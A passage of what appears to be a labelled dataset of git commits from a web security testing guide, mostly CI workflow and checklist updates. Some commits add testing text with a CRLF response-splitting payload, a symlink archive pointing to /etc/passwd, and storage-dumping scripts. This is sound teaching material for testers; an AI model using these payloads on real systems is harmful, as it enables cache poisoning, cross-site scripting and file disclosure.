}}\n+    - name: Checkout PR\n+      uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6\n+      with:\n+        ref: ${{ github.event.pull_request.head.sha }}\n+            OUTPUT=\"$(markdownlint-cli2 \"$FILE\" --config base/.github/configs/.markdownlint.json 2>&1)\" || STATUS=$?\n+              printf '%s\\n' \"$OUTPUT\" | tee -a lint.txt\n+        ref: ${{ github.base_ref || 'master' }}\n+    - name: Checkout PR\n+      uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6\n+      with:\n+        ref: ${{ github.event.pull_request.head.sha }}\n+        for FILE in $FILES; do echo \"$FILE\" | grep -v \\.github && textlint --config base/.github/configs/.textlintrc --fix --rule terminology \"$FILE\" | tee -a log.txt; done",
    "label": 0
  },
  {
    "hash": "cdc981879267afcc10a11ef28f09d01638b8d391",
    "message": "Replace umani/changed-files with native git diff (#1333)",
    "files": [
      ".github/workflows/md-link-check.yml",
      ".github/workflows/md-lint-check.yml",
      ".github/workflows/md-textlint-check.yml"
    ],
    "extensions": [
      "yml"
    ],
    "added_lines": "+    - name: Get Changed Files\n+      run: |\n+        # Get list of changed .md files (excluding .github/)\n+        git fetch origin ${{ github.base_ref }}\n+        FILES=$(git diff --name-only --diff-filter=d origin/${{ github.base_ref }}...HEAD | grep '\\.md$' | grep -v '^\\.github/' || true)\n+        # Convert newlines to spaces for compatibility with expected format\n+        FILES_SPACE_SEPARATED=$(echo \"$FILES\" | tr '\\n' ' ' | xargs)\n+        echo \"files_updated=$FILES_SPACE_SEPARATED\" >> $GITHUB_OUTPUT\n+      shell: bash\n+        FILES: '${{ steps.files.outputs.files_updated }}'\n+        FILES: '${{ steps.files.outputs.files_updated }}'\n+    - name: Get Changed Files\n+      run: |\n+        # Get list of changed .md files (excluding .github/)\n+        git fetch origin ${{ github.base_ref }}\n+        FILES=$(git diff --name-only --diff-filter=d origin/${{ github.base_ref }}...HEAD | grep '\\.md$' | grep -v '^\\.github/' || true)\n+        # Convert newlines to spaces for compatibility with expected format\n+        FILES_SPACE_SEPARATED=$(echo \"$FILES\" | tr '\\n' ' ' | xargs)\n+        echo \"files_updated=$FILES_SPACE_SEPARATED\" >> $GITHUB_OUTPUT\n+      shell: bash\n+        FILES: '${{ steps.files.outputs.files_updated }}'\n+        FILES: '${{ steps.files.outputs.files_updated }}'\n+    - name: Get Changed Files\n+      run: |\n+        # Get list of changed .md files (excluding .github/)\n+        git fetch origin ${{ github.base_ref }}\n+        FILES=$(git diff --name-only --diff-filter=d origin/${{ github.base_ref }}...HEAD | grep '\\.md$' | grep -v '^\\.github/' || true)\n+        # Convert newlines to spaces for compatibility with expected format\n+        FILES_SPACE_SEPARATED=$(echo \"$FILES\" | tr '\\n' ' ' | xargs)\n+        echo \"files_updated=$FILES_SPACE_SEPARATED\" >> $GITHUB_OUTPUT\n+      shell: bash\n+        FILES: '${{ steps.files.outputs.files_updated }}'\n+        FILES: '${{ steps.files.outputs.files_updated }}'",
    "label": 0
  },
  {
    "hash": "e6c8e03c3be989156b4f12a468140e3577887451",
    "message": "Standardize merged test metadata using reference link marker (#1329)",
    "files": [
      ".github/configs/.markdownlint.json",
      "document/4-Web_Application_Security_Testing/01-Information_Gathering/09-Fingerprint_Web_Application.md",
      "document/4-Web_Application_Security_Testing/03-Identity_Management_Testing/05-Testing_for_Weak_or_Unenforced_Username_Policy.md",
      "document/4-Web_Application_Security_Testing/04-Authentication_Testing/01-Testing_for_Credentials_Transported_over_an_Encrypted_Channel.md",
      "document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/03-Testing_for_HTTP_Verb_Tampering.md",
      "document/4-Web_Application_Security_Testing/08-Testing_for_Error_Handling/02-Testing_for_Stack_Traces.md",
      "template/README.md"
    ],
    "extensions": [
      "json",
      "md"
    ],
    "added_lines": "+  \"MD053\": false,\n+\n+[merged]: # (WSTG-INFO-08)\n+\n+[merged]: # (WSTG-IDNT-04)\n+\n+[merged]: # (WSTG-CRYP-03)\n+\n+[merged]: # (WSTG-CONF-06)\n+\n+[merged]: # (WSTG-ERRH-01)\n+\n+## Merged or Retired Tests\n+\n+When a test is merged into another test, retain the original file to preserve ID continuity.\n+\n+At the end of the file, include the following reference-style metadata marker:\n+\n+`[merged]: # (WSTG-XXXX-XX)`\n+\n+Replace `WSTG-XXXX-XX` with the destination test ID.\n+\n+This ensures merged tests are explicitly identifiable while keeping the Markdown valid and render-safe.",
    "label": 0
  },
  {
    "hash": "0f42f05c7931700082f6bb17d42cc2b82dc5e269",
    "message": "Fix comment workflow artifact download to handle missing artifacts gracefully (#1331)",
    "files": [
      ".github/workflows/comment.yml"
    ],
    "extensions": [
      "yml"
    ],
    "added_lines": "+        id: download-artifact\n+        continue-on-error: true\n+        if: steps.download-artifact.outcome == 'success'",
    "label": 0
  },
  {
    "hash": "9f0404d91c2c94cde3d7480ed1b131c7ce7db5a5",
    "message": "Fix formatting in .textlintrc configuration (#1330)",
    "files": [
      ".github/configs/.textlintrc"
    ],
    "extensions": [
      "textlintrc"
    ],
    "added_lines": "+\t\t\t\t],",
    "label": 0
  },
  {
    "hash": "d4ab12b7064c0bc78f42b516424d14c67374fe0b",
    "message": "Publish Latest checklists 2026-02-17 (#1327)",
    "files": [
      "checklists/README.md",
      "checklists/checklist.json",
      "checklists/checklist.xlsx"
    ],
    "extensions": [
      "json",
      "md",
      "xlsx"
    ],
    "added_lines": "+SHA-256: 8858d2807d9d553455952c3d1c156ca8a808c77529fe06067b47e9727fa45c2a\n+                    \"Determine whether the site is storing sensitive data in client-side storage.\",",
    "label": 0
  },
  {
    "hash": "23a71baae770e2f9f4f27166d985ad6b544bebc6",
    "message": "Enhance WSTG-CLNT-12: Add security implications and testing guidance for browser storage (#1326)",
    "files": [
      "document/4-Web_Application_Security_Testing/11-Client-side_Testing/12-Testing_Browser_Storage.md"
    ],
    "extensions": [
      "md"
    ],
    "added_lines": "+|ID \u00a0 \u00a0 \u00a0 \u00a0 \u00a0|\n+- LocalStorage\n+- SessionStorage\n+- Determine whether the site is storing sensitive data in client-side storage.\n+### LocalStorage\n+\u00a0 const key = localStorage.key(i);\n+\u00a0 const value = localStorage.getItem(key);\n+\u00a0 console.log(`${key}: ${value}`);\n+### SessionStorage\n+\u00a0 const key = sessionStorage.key(i);\n+\u00a0 const value = sessionStorage.getItem(key);\n+\u00a0 console.log(`${key}: ${value}`);\n+In contrast to localStorage and sessionStorage, IndexedDB can store more than just strings. Any objects supported by the [structured clone algorithm](https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Structured_clone_algorithm) can be stored in IndexedDB.\n+An example of a complex JavaScript object that can be stored in IndexedDB, but not in localStorage/sessionStorage are [CryptoKeys](https://developer.mozilla.org/en-US/docs/Web/API/CryptoKey).\n+\u00a0 const DB_VERSION = 1;\n+\u00a0 const req = indexedDB.open(dbName, DB_VERSION);\n+\u00a0 req.onsuccess = function() {\n+\u00a0 \u00a0 const db = req.result;\n+\u00a0 \u00a0 const objectStoreNames = db.objectStoreNames || [];\n+\n+\u00a0 \u00a0 console.log(`[*] Database: ${dbName}`);\n+\n+\u00a0 \u00a0 Array.from(objectStoreNames).forEach(storeName => {\n+\u00a0 \u00a0 \u00a0 const txn = db.transaction(storeName, 'readonly');\n+\u00a0 \u00a0 \u00a0 const objectStore = txn.objectStore(storeName);\n+\n+\u00a0 \u00a0 \u00a0 console.log(`\\t[+] ObjectStore: ${storeName}`);\n+\n+\u00a0 \u00a0 \u00a0 // Print all entries in objectStore with name `storeName`\n+\u00a0 \u00a0 \u00a0 objectStore.getAll().onsuccess = event => {\n+\u00a0 \u00a0 \u00a0 \u00a0 const items = event.target.result || [];\n+\u00a0 \u00a0 \u00a0 \u00a0 items.forEach(item => console.log(`\\t\\t[-] `, item));\n+\u00a0 \u00a0 \u00a0 };\n+\u00a0 \u00a0 });\n+\u00a0 };\n+\u00a0 counter: 0,\n+\u00a0 flag: false,\n+\u00a0 // create an iframe and append to body to load a clean window object\n+\u00a0 const iframe = document.createElement('iframe');\n+\u00a0 iframe.style.display = 'none';\n+\u00a0 document.body.appendChild(iframe);\n+\u00a0 // get the current list of properties on window\n+\u00a0 const currentWindow = Object.getOwnPropertyNames(window);\n+\u00a0 // filter the list against the properties that exist in the clean window\n+\u00a0 const results = currentWindow.filter(\n+\u00a0 \u00a0 prop => !iframe.contentWindow.hasOwnProperty(prop)\n+\u00a0 );\n+\u00a0 // remove iframe\n+\u00a0 document.body.removeChild(iframe);\n+\u00a0 // log key-value entries that are different\n+\u00a0 results.forEach(key => console.log(`${key}: ${window[key]}`));\n+### Security Implications\n+\n+When reviewing browser storage mechanisms, testers should evaluate whether sensitive data is unnecessarily exposed on the client-side. Modern applications, especially SPAs, frequently store authentication tokens or application state in browser storage, which may introduce security risks.\n+\n+Common concerns include:\n+\n+- Authentication tokens (e.g., JWTs) stored in `localStorage` or `sessionStorage`, which are accessible via JavaScript and may be exposed through XSS.\n+- Tokens or session identifiers persisting after logout.\n+- Sensitive business data stored in IndexedDB or localStorage without a clear requirement.\n+- Cryptographic material stored as extractable when it should be protected.\n+\n+Improper client-side storage may increase the impact of client-side attacks such as DOM-based XSS.\n+\n+### General Testing Guidance\n+\n+In addition to enumerating storage entries, testers should:\n+\n+- Inspect browser storage using developer tools (Application/Storage tab).\n+- Identify authentication tokens, session identifiers, or sensitive business data.\n+- Attempt to access stored values via the JavaScript console.\n+- Verify whether storage entries are cleared after logout or session expiration.\n+- Assess whether stored data could be leveraged in a client-side attack chain.\n+\n+Following the identification of any of the above attack vectors, an attack chain can be formed with different types of client-side attacks, such as [DOM based XSS](01-Testing_for_DOM-based_Cross_Site_Scripting.md) attacks.\n+- [LocalStorage](https://developer.mozilla.org/en-US/docs/Web/API/Window/localStorage)\n+- [SessionStorage](https://developer.mozilla.org/en-US/docs/Web/API/Window/sessionStorage)",
    "label": 1
  },
  {
    "hash": "3fc68caa3fb62e60f10553c325ae5e96db7c7e83",
    "message": "Update workflows README to document current implementation and security enhancements (#1324)",
    "files": [
      ".github/workflows/README.md"
    ],
    "extensions": [
      "md"
    ],
    "added_lines": "+This directory contains GitHub Actions workflows for the WSTG repository. Helper scripts used by these workflows are located in the `scripts/` subdirectory (with its own README).\n+\n+## Version Information\n+\n+These workflows use:\n+- Node.js and Python for various automation tasks\n+- GitHub Actions for checkout, setup, artifact management, and API interactions\n+\n+This workflow:\n+- Minimizes (collapses) previous comments from the same workflow run with appropriate classifiers:\n+  - `RESOLVED` when the workflow succeeds\n+  - `OUTDATED` when the workflow fails\n+- Only posts NEW comments on failure (not on success)\n+- Uses GitHub Actions for artifact retrieval and PR comment management\n+\n+Utility action named \"Markdown Lint Check\" (same name as `md-lint-check.yml`) that serves as a fallback to satisfy branch protection requirements. This workflow only runs when NO Markdown files are changed in a PR (e.g., only an image or YAML that isn't linted). It's a complementary workflow to `md-lint-check.yml` that ensures the required \"Markdown Lint Check\" status check passes even when there are no Markdown files to lint.\n+- Trigger: Pull Requests (when no `.md` files are changed).\n+This workflow includes security enhancements:\n+- Input validation for repository names and commit SHAs to prevent injection attacks\n+- Sparse checkout for security and efficiency (only checking out changed files)\n+\n+- Trigger: Pull Requests (when `.md` files are changed, excluding `.github/**`). Manual (`workflow_dispatch`).\n+This workflow:\n+- Uses `markdownlint-cli2` for linting\n+- Leverages sparse checkout for security and efficiency (only checking out changed files)\n+- Uses `format_lint_output.py` script to format output for PR comments\n+- Uploads artifacts for both success and failure cases to work with `comment.yml`\n+\n+Security enhancements:\n+- Input validation for repository names and commit SHAs to prevent injection attacks\n+- Sparse checkout for security and efficiency\n+\n+- Trigger: Pull Requests (when `.md` files are changed, excluding `.github/**`).\n+This workflow includes security enhancements:\n+- Input validation for repository names and commit SHAs to prevent injection attacks\n+- Sparse checkout for security and efficiency (only checking out changed files)\n+\n+- Trigger: Pull Requests (when `.md` files are changed, excluding `.github/**`).",
    "label": 0
  },
  {
    "hash": "d1d246315d402a418a91d6df16728705ebf8bb08",
    "message": "Bump actions/download-artifact from 6 to 7 in the dependencies group (#1323)",
    "files": [
      ".github/workflows/comment.yml"
    ],
    "extensions": [
      "yml"
    ],
    "added_lines": "+        uses: actions/download-artifact@37930b1c2abaa49bbe596cd826c3c89aef350131 # v7.0.0",
    "label": 0
  },
  {
    "hash": "2a3c25f03bf53738e4f2638303c3f4c996c0f17d",
    "message": "Update GitHub Actions to use SHA references (#1322)",
    "files": [
      ".github/workflows/build-checklists.yml",
      ".github/workflows/build-ebooks.yml",
      ".github/workflows/comment.yml",
      ".github/workflows/md-link-check.yml",
      ".github/workflows/md-lint-check.yml",
      ".github/workflows/md-textlint-check.yml"
    ],
    "extensions": [
      "yml"
    ],
    "added_lines": "+      uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6\n+      uses: actions/setup-node@6044e13b5dc448c55e2357c09f80417699197238 # v6\n+      uses: actions/setup-python@a309ff8b426b58ec0e2a45f0f869d46889d02405 # v6\n+      uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6\n+      uses: actions/setup-node@6044e13b5dc448c55e2357c09f80417699197238 # v6\n+      uses: actions/setup-python@a309ff8b426b58ec0e2a45f0f869d46889d02405 # v6\n+      uses: actions/upload-artifact@b7c566a772e6b6bfb58ed0dc250532a479d7789f # v6\n+        uses: actions/download-artifact@018cc2cf5baa6db3ef3c5f8a56943fffe632ef53 # v6\n+        uses: actions/github-script@ed597411d8f924073f98dfc5c65a23a2325f34cd # v8\n+      uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6\n+      uses: actions/setup-node@6044e13b5dc448c55e2357c09f80417699197238 # v6\n+      uses: actions/upload-artifact@b7c566a772e6b6bfb58ed0dc250532a479d7789f # v6\n+      uses: actions/upload-artifact@b7c566a772e6b6bfb58ed0dc250532a479d7789f # v6\n+      uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6\n+      uses: actions/setup-node@6044e13b5dc448c55e2357c09f80417699197238 # v6\n+      uses: actions/upload-artifact@b7c566a772e6b6bfb58ed0dc250532a479d7789f # v6\n+      uses: actions/upload-artifact@b7c566a772e6b6bfb58ed0dc250532a479d7789f # v6\n+      uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6\n+      uses: actions/setup-node@6044e13b5dc448c55e2357c09f80417699197238 # v6\n+      uses: actions/upload-artifact@b7c566a772e6b6bfb58ed0dc250532a479d7789f # v6\n+      uses: actions/upload-artifact@b7c566a772e6b6bfb58ed0dc250532a479d7789f # v6",
    "label": 0
  },
  {
    "hash": "3e1c9cd283b0d7cda723f417845cde7ff998be93",
    "message": "Automatically minimize outdated workflow comments on PRs (#1321)",
    "files": [
      ".github/workflows/comment.yml",
      ".github/workflows/md-link-check.yml",
      ".github/workflows/md-lint-check.yml",
      ".github/workflows/md-textlint-check.yml"
    ],
    "extensions": [
      "yml"
    ],
    "added_lines": "+        uses: actions/download-artifact@v6\n+      \n+      - name: Manage PR Comments\n+            const fs = require('fs');\n+            \n+            // Read PR number and validate\n+            let issue_number;\n+            try {\n+              issue_number = Number(fs.readFileSync('./pr_number', 'utf8').trim());\n+            } catch (error) {\n+              console.log('Could not read PR number, skipping comment management');\n+              return;\n+            }\n+            \n+            // Validate PR number\n+            if (!issue_number || issue_number < 1 || !Number.isInteger(issue_number)) {\n+              console.log(`Invalid PR number: ${issue_number}`);\n+              return;\n+            }\n+            \n+            // Determine workflow identifier based on the triggering workflow\n+            const workflowName = context.payload.workflow_run.name;\n+            const workflowIdentifier = `<!-- workflow-comment: ${workflowName} -->`;\n+            \n+            // Minimize previous comments from this workflow\n+            try {\n+              // Get all comments on the PR (paginate to handle more than one page)\n+              const comments = await github.paginate(\n+                github.rest.issues.listComments,\n+                {\n+                  owner: context.repo.owner,\n+                  repo: context.repo.repo,\n+                  issue_number: issue_number,\n+                  per_page: 100,\n+                }\n+              );\n+              \n+              // Find comments from this workflow authored by the GitHub Actions bot\n+              const workflowComments = comments.filter(comment =>\n+                comment.body &&\n+                comment.body.includes(workflowIdentifier) &&\n+                comment.user &&\n+                comment.user.login === 'github-actions[bot]'\n+              );\n+              \n+              // Minimize each previous comment with appropriate classifier\n+              const classifier = context.payload.workflow_run.conclusion === 'success' ? 'RESOLVED' : 'OUTDATED';\n+              \n+              for (const comment of workflowComments) {\n+                try {\n+                  // Use GraphQL API to minimize comment with parameterized query\n+                  await github.graphql(\n+                    `mutation($commentId: ID!, $classifier: ReportedContentClassifiers!) {\n+                      minimizeComment(input: {subjectId: $commentId, classifier: $classifier}) {\n+                        minimizedComment {\n+                          isMinimized\n+                        }\n+                      }\n+                    }`,\n+                    {\n+                      commentId: comment.node_id,\n+                      classifier: classifier\n+                    }\n+                  );\n+                  console.log(`Minimized comment ${comment.id} as ${classifier}`);\n+                } catch (error) {\n+                  console.log(`Failed to minimize comment ${comment.id}: ${error.message}`);\n+                }\n+              }\n+            } catch (error) {\n+              console.log(`Error managing previous comments: ${error.message}`);\n+            }\n+            \n+            // Post new comment only on failure\n+            if (context.payload.workflow_run.conclusion === 'failure') {\n+              try {\n+                // Check if artifact.txt exists before reading\n+                if (!fs.existsSync('./artifact.txt')) {\n+                  console.log('artifact.txt not found, skipping comment post');\n+                  return;\n+                }\n+                \n+                const artifactString = fs.readFileSync('./artifact.txt', 'utf8').trimEnd();\n+                const commentBody = `${workflowIdentifier}\\n${artifactString}`;\n+                \n+                await github.rest.issues.createComment({\n+                  owner: context.repo.owner,\n+                  repo: context.repo.repo,\n+                  issue_number: issue_number,\n+                  body: commentBody\n+                });\n+                console.log('Posted new comment with issues found');\n+              } catch (error) {\n+                console.log(`Failed to post comment: ${error.message}`);\n+                throw error;\n+              }\n+            } else {\n+              console.log('Workflow succeeded, no new comment needed');\n+            }\n+    - name: Upload PR number on success\n+      if: success()\n+      uses: actions/upload-artifact@v6\n+      with:\n+        name: artifact\n+        path: pr_number\n+    - name: Upload PR number on success\n+      if: success()\n+      uses: actions/upload-artifact@v6\n+      with:\n+        name: artifact\n+        path: pr_number\n+    - name: Upload PR number on success\n+      if: success()\n+      uses: actions/upload-artifact@v6\n+      with:\n+        name: artifact\n+        path: pr_number",
    "label": 0
  },
  {
    "hash": "853eb6a44d30a766a59e74e715ce930df02cb823",
    "message": "Add archive symlink attack testing technique to WSTG-BUSL-09 (#1318)",
    "files": [
      "document/4-Web_Application_Security_Testing/10-Business_Logic_Testing/09-Test_Upload_of_Malicious_Files.md"
    ],
    "extensions": [
      "md"
    ],
    "added_lines": "+#### Archive Symlink Attacks\n+\n+If the application extracts archive files (such as ZIP or TAR), it is important to verify how symbolic links contained within the archive are handled. Unlike Archive Directory Traversal (ZIP Slip), this technique does not rely on `../` path traversal sequences.\n+\n+An attacker can craft an archive containing a symbolic link that points to a sensitive file on the server (for example `/etc/passwd`). If the extraction process preserves symbolic links without validation, and the application later processes or exposes the extracted files, this may result in unintended access to sensitive system files.\n+\n+For example, a malicious archive may contain: `link.txt -> /etc/passwd`\n+\n+If the backend extracts this archive without validating or rejecting symbolic links, and the application reads `link.txt`, it may inadvertently disclose the contents of `/etc/passwd`.\n+\n+##### How to Test\n+\n+1. Create a symbolic link: `ln -s /etc/passwd link.txt`\n+1. Create an archive: `tar -czf malicious.tar.gz link.txt`\n+1. Upload the archive to the application.\n+1. Check:\n+   - Is the symbolic link extracted?\n+   - Does the application follow the link?\n+   - Can sensitive file contents be accessed?\n+\n+##### Impact\n+\n+- Arbitrary file read\n+- Disclosure of sensitive information\n+",
    "label": 1
  },
  {
    "hash": "4159975aa92de3719b13014f60f0a8a004926d5a",
    "message": "Publish Latest checklists 2026-02-16 (#1320)",
    "files": [
      "checklists/README.md",
      "checklists/checklist.json",
      "checklists/checklist.xlsx"
    ],
    "extensions": [
      "json",
      "md",
      "xlsx"
    ],
    "added_lines": "+SHA-256: 3b40db307da220abc92c17e9260bb8351fd12a614d39249ac080114dd2c4a3ce\n+                    \"\"",
    "label": 0
  },
  {
    "hash": "fc45768f39c7838afd174772a83443b09cf3e2c5",
    "message": "Merge WSTG-IDNT-05 into WSTG-IDNT-04 (#1317)",
    "files": [
      "document/4-Web_Application_Security_Testing/03-Identity_Management_Testing/04-Testing_for_Account_Enumeration_and_Guessable_User_Account.md",
      "document/4-Web_Application_Security_Testing/03-Identity_Management_Testing/05-Testing_for_Weak_or_Unenforced_Username_Policy.md"
    ],
    "extensions": [
      "md"
    ],
    "added_lines": "+#### Predictable Username Structures\n+\n+In many organizations, usernames follow consistent patterns (e.g., first initial + last name such as jbloggs, or structured identifiers such as CN000100). If the naming convention can be identified, valid usernames can often be derived systematically.\n+\n+Testers should:\n+\n+- Identify whether usernames follow a predictable structure.\n+- Attempt to generate additional usernames based on observed patterns.\n+- Use username dictionaries derived from organizational data (e.g., staff names, email formats).\n+- Observe application responses to determine whether generated usernames are valid.\n+\n+Predictable username structures significantly reduce the effort required to enumerate valid accounts and can facilitate further attacks such as brute force attempts.\n+\n+In the above sample we can create simple shell scripts that compose user IDs and submit a request with tool like wget to automate a web query to discern valid user IDs. To create a script we can also use Perl and cURL.\n+- [cURL](https://curl.haxx.se/)\n+This test has been merged into WSTG-IDNT-04 (Testing for Account Enumeration and Guessable User Accounts) due to overlapping scope related to predictable username structures and enumeration techniques.",
    "label": 1
  },
  {
    "hash": "f22b7202eb20c14b973d01e963c00a29a33ae6aa",
    "message": "Publish Latest checklists 2026-02-16 (#1319)",
    "files": [
      "checklists/README.md",
      "checklists/checklist.json",
      "checklists/checklist.xlsx"
    ],
    "extensions": [
      "json",
      "md",
      "xlsx"
    ],
    "added_lines": "+SHA-256: 387fe950cbab5a473d7bacc9aa5639c789199dfe41e1ec40eecb31593d0b3c9c\n+                \"name\":\"Testing for HTTP Response Splitting\",\n+                \"reference\":\"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/15-Testing_for_HTTP_Response_Splitting\",\n+                    \"Identify user-controlled input that is reflected into HTTP response headers.\",\n+                    \"Assess whether CR (`r`) and LF (`n`) characters can be injected into response headers.\",\n+                    \"Determine the potential impact of successful HTTP Response Splitting attacks, such as cache poisoning or client-side exploitation.\"\n+                \"name\":\"Testing for HTTP Request Smuggling\",\n+                \"reference\":\"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/16-Testing_for_HTTP_Request_Smuggling\",\n+                    \"Identify request boundary inconsistencies between frontend and backend components\",\n+                    \"Detect classic CL/TE desynchronization vulnerabilities\",\n+                    \"Evaluate protocol translation logic (HTTP/2 \u2192 HTTP/1.1)\",\n+                    \"Assess H2C upgrade handling and downgrade safety\",\n+                    \"Confirm backend request queue poisoning\"",
    "label": 0
  },
  {
    "hash": "ee2f38a676a3f2527af7dbbaf57982a5c16fa60e",
    "message": "refactor(inpv-15, inpv-16): separate and modernize response splitting and request smuggling guides (#1314)",
    "files": [
      "document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/15-Testing_for_HTTP_Response_Splitting.md",
      "document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/15-Testing_for_HTTP_Splitting_Smuggling.md",
      "document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/16-Testing_for_HTTP_Incoming_Requests.md",
      "document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/16-Testing_for_HTTP_Request_Smuggling.md",
      "document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/README.md",
      "document/README.md"
    ],
    "extensions": [
      "md"
    ],
    "added_lines": "+# Testing for HTTP Response Splitting\n+\n+|ID          |\n+|------------|\n+|WSTG-INPV-15|\n+\n+## Summary\n+\n+HTTP Response Splitting is a vulnerability that occurs when an application incorporates unsanitized user input into HTTP response headers, allowing an attacker to inject Carriage Return (CR) and Line Feed (LF) characters. As a result, a single HTTP response can be interpreted as multiple distinct responses by clients or intermediary systems.\n+\n+Successful exploitation of HTTP Response Splitting can lead to various impacts, including web cache poisoning, cross-site scripting (XSS), content spoofing, session fixation, or other client-side attacks, depending on how the injected response is processed.\n+\n+This section focuses exclusively on identifying and testing HTTP Response Splitting vulnerabilities at the application layer. HTTP Request Smuggling, which relies on parsing inconsistencies between multiple HTTP agents, is covered in a separate chapter.\n+\n+## Test Objectives\n+\n+- Identify user-controlled input that is reflected into HTTP response headers.\n+- Assess whether CR (`\\r`) and LF (`\\n`) characters can be injected into response headers.\n+- Determine the potential impact of successful HTTP Response Splitting attacks, such as cache poisoning or client-side exploitation.\n+\n+## How to Test\n+\n+### Black-Box Testing\n+\n+Some web applications use user-supplied input to generate the values of certain HTTP response headers. A common example is redirection logic, where the destination URL is derived from a request parameter.\n+\n+For instance, assume a user is asked to choose between a standard or advanced interface. The selected option is passed as a parameter and reflected in a redirection response header.\n+\n+If the parameter `interface` has the value `advanced`, the application may respond with:\n+\n+```http\n+HTTP/1.1 302 Moved Temporarily\n+Date: Sun, 03 Dec 2005 16:22:19 GMT\n+Location: https://victim.com/main.jsp?interface=advanced\n+```\n+\n+When the browser receives this response, it follows the URL specified in the `Location` header. However, if the application does not properly validate or sanitize user input, an attacker may inject the sequence `%0d%0a`, representing CRLF characters used to separate HTTP header lines.\n+\n+By injecting CRLF sequences, a tester may cause the response to be interpreted as two separate HTTP responses by downstream clients or intermediary systems, such as web caches. This behavior can be exploited to poison caches or deliver malicious content to users.\n+\n+For example, the tester supplies the following value for the `interface` parameter:\n+\n+`advanced%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2035%0d%0a%0d%0a<html>Sorry,%20System%20Down</html>`\n+\n+The resulting response from the vulnerable application may be:\n+\n+```http\n+HTTP/1.1 302 Moved Temporarily\n+Date: Sun, 03 Dec 2005 16:22:19 GMT\n+Location: https://victim.com/main.jsp?interface=advanced\n+Content-Length: 0\n+\n+HTTP/1.1 200 OK\n+Content-Type: text/html\n+Content-Length: 35\n+\n+<html>Sorry,%20System%20Down</html>\n+```\n+\n+A web cache processing this response may interpret it as two distinct responses. If the attacker immediately issues a subsequent request for `/index.html`, the cache may associate that request with the second response and store it. As a result, all subsequent users accessing `victim.com/index.html` through that cache may receive the attacker-controlled content.\n+\n+Alternatively, the attacker may inject a JavaScript payload to perform a cross-site scripting attack against users served by the poisoned cache. Although the vulnerability resides in the application, the primary targets are its users.\n+\n+To identify this issue, testers should locate all user-controlled input that influences HTTP response headers and verify whether CRLF sequences can be injected.\n+\n+The response headers most commonly associated with HTTP Response Splitting include:\n+\n+- `Location`\n+- `Set-Cookie`\n+\n+Successful exploitation in real-world scenarios may require careful consideration of additional factors:\n+\n+- The tester may need to craft response headers suitable for caching (e.g., `Last-Modified` set to a future date) and potentially invalidate existing cache entries using headers such as `Pragma: no-cache`.\n+- Applications may filter CRLF characters but allow alternative encodings or character representations, which can sometimes be leveraged to bypass input validation.\n+- Some platforms URL-encode portions of response headers (such as the path in the `Location` header) while leaving the query string unencoded, allowing injection through specific components of the URL.\n+\n+For a deeper discussion of this attack class and additional exploitation scenarios, refer to the whitepapers listed in the References section.\n+\n+### Gray-Box Testing\n+\n+In a gray-box testing scenario, knowledge of application architecture and server behavior improves exploitation reliability.\n+\n+Differen",
    "label": 1
  },
  {
    "hash": "423e9250bfc14c4e1b0f6f5f77076ce7b626b677",
    "message": "Publish Latest checklists 2026-02-16 (#1316)",
    "files": [
      "checklists/README.md",
      "checklists/checklist.json",
      "checklists/checklist.xlsx"
    ],
    "extensions": [
      "json",
      "md",
      "xlsx"
    ],
    "added_lines": "+SHA-256: 49d1aa385e6622451bd4ce46e76fa7fce446b99e7c13923e300221128f22b4da\n+                    \"Enumerate sensitive file extensions that might contain raw data such as scripts or credentials\",",
    "label": 0
  },
  {
    "hash": "b432a5edeba071ebae43e7b563b418d697e5e77d",
    "message": "Clarify File Upload subsection scope in WSTG-CONF-03 (#1313)",
    "files": [
      "document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/03-Test_File_Extensions_Handling_for_Sensitive_Information.md"
    ],
    "extensions": [
      "md"
    ],
    "added_lines": "+Web servers commonly use file extensions to determine which technologies, languages, and plugins must be used to fulfill web requests. While this behavior is consistent with RFCs and Web Standards, using standard file extensions provides the penetration tester useful information about the underlying technologies used in a web appliance and greatly simplifies the task of determining the attack scenario to be used on particular technologies. In addition, misconfiguration of web servers could easily reveal confidential information about access credentials.\n+- Enumerate sensitive file extensions that might contain raw data such as scripts or credentials\n+Windows 8.3 legacy filename handling on Windows-based systems can affect how files are resolved and accessed by the web server. While this behavior is often discussed in the context of file upload restrictions, it is also relevant when assessing how existing files with non-standard or legacy names may be exposed.\n+In environments where 8.3 filename generation is enabled, sensitive files that are otherwise not directly accessible using their long filenames may still be reachable through their shortened equivalents. This can lead to unintended disclosure of source code or configuration files if access controls are not consistently enforced.\n+Examples of 8.3 filename resolution behavior that may lead to unintended file exposure:\n+\n+1. A file such as `file.phtml` may be processed as PHP code.\n+2. A corresponding shortened filename (for example, `FILE~1.PHT`) may be accessible depending on server and handler configuration.\n+3. Files with misleading or extended filenames may still resolve to executable handlers once expanded by the operating system.\n+\n+Testing should focus on identifying whether legacy filename handling allows access to sensitive files that were not intended to be served. Testing of file upload mechanisms themselves is covered in dedicated File Upload and Business Logic test cases.\n+- [cURL](https://curl.haxx.se)",
    "label": 1
  },
  {
    "hash": "935f332af44c80d5c17af891d4858ab6f2d0e98a",
    "message": "Improve markdown lint PR comment formatting (#1311)",
    "files": [
      ".github/workflows/md-lint-check.yml",
      ".github/workflows/scripts/README.md",
      ".github/workflows/scripts/format_lint_output.py",
      ".gitignore"
    ],
    "extensions": [
